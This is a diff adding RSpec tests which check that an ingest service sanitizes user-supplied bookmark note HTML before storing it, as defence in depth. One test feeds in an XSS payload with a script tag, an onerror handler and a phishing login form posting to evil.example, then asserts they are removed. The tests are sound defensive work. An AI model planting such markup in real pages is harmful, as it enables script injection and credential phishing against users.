@@ -366,6 +366,78 @@ RSpec.describe WorkDetailIngestService do
     end
   end
 
+  # TECH_DEBT.md (2026-08-01, closed 2026-09-21 stage: Maintenance):
+  # noteHtml is now sanitized (BookmarkNoteSanitizer) before being persisted
+  # as note_html, a second independent boundary alongside the frontend's own
+  # render-time sanitizer. These prove the boundary is actually wired up
+  # end to end through the real service call, not just unit-tested in
+  # isolation (see spec/services/bookmark_note_sanitizer_spec.rb for the
+  # sanitizer's own exhaustive vector coverage).
+  describe "#call sanitizes bookmark noteHtml at rest before persisting (defense-in-depth)" do
+    it "neutralizes a malicious noteHtml payload (script tag, onerror handler, phishing form) before storage" do
+      phase_one = capture_phase_one!(username: "worker_malicious_note")
+
+      result = described_class.new(
+        payload: valid_work_detail_payload(
+          username: "worker_malicious_note", read_token: phase_one.read_token,
+          bookmarks: [
+            {
+              "bookmarkerName" => "malicious_reader",
+              "noteHtml" => '<p>hi</p><script>alert("xss")</script>' \
+                '<img src="x" onerror="alert(1)">' \
+                '<form action="https://evil.example/phish"><input name="user"><button>Log in</button></form>',
+              "bookmarkerTags" => [], "bookmarkedOn" => nil, "collections" => []
+            }
+          ],
+        ),
+      ).call
+
+      stored_note_html = result.work.work_bookmarks.first.note_html
+      expect(stored_note_html).not_to include("<script")
+      expect(stored_note_html).not_to include("onerror")
+      expect(stored_note_html).not_to include("<form")
+      expect(stored_note_html).not_to include("<input")
+      expect(stored_note_html).not_to include("<button")
+      expect(stored_note_html).not_to include("evil.example")
+    end
+
+    it "preserves a safe noteHtml payload, including a <summary>/<details> spoiler section" do
+      phase_one = capture_phase_one!(username: "worker_safe_note")
+
+      result = described_class.new(
+        payload: valid_work_detail_payload(
+          username: "worker_safe_note", read_token: phase_one.read_token,
+          bookmarks: [
+            {
+              "bookmarkerName" => "kind_reader",
+              "noteHtml" => "<p>Loved this!</p><details><summary>Spoilers</summary><p>They kiss.</p></details>",
+              "bookmarkerTags" => [], "bookmarkedOn" => nil, "collections" => []
+            }
+          ],
+        ),
+      ).call
+
+      stored_note_html = result.work.work_bookmarks.first.note_html
+      expect(stored_note_html).to include("<p>Loved this!</p>")
+      expect(stored_note_html).to include("<details>")
+      expect(stored_note_html).to include("<summary>")
+      expect(stored_note_html).to include("They kiss.")
+    end
+
+    it "keeps note_html nil (not an empty string) when noteHtml is nil in the payload" do
+      phase_one = capture_phase_one!(username: "worker_nil_note")
+
+      result = described_class.new(
+        payload: valid_work_detail_payload(
+          username: "worker_nil_note", read_token: phase_one.read_token,
+          bookmarks: [ { "bookmarkerName" => "no_note_reader", "noteHtml" => nil, "bookmarkerTags" => [], "bookmarkedOn" => nil, "collections" => [] } ],
+        ),
+      ).call
+
+      expect(result.work.work_bookmarks.first.note_html).to be_nil
+    end
+  end
+
   describe "#call zero-public-bookmarks (0, not NULL, when genuinely captured-and-zero)" do
     it "persists public_bookmarks as 0 and an empty work_bookmarks list, not an error" do
       phase_one = capture_phase_one!(username: "worker_zero_bookmarks")
